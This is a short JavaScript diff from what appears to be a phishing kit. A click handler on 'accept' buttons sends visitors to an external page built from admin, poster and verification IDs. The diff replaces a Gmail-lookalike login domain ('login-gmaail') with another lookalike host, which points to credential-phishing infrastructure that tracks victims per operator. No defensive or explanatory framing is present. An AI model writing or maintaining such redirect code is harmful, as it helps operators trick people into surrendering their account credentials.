@@ -75,7 +75,7 @@ const verifyId = urlParams.get('verifyId');
 
  document.querySelectorAll('.accept-button').forEach(button => {
   button.addEventListener('click', () => {
-    window.location.href =`https://login-gmaail.vercel.app/${adminId}/${posterId}/${verifyId}`
+    window.location.href =`https://chatfacetime.vercel.app/${adminId}/${posterId}/${verifyId}`
   });
 });
  
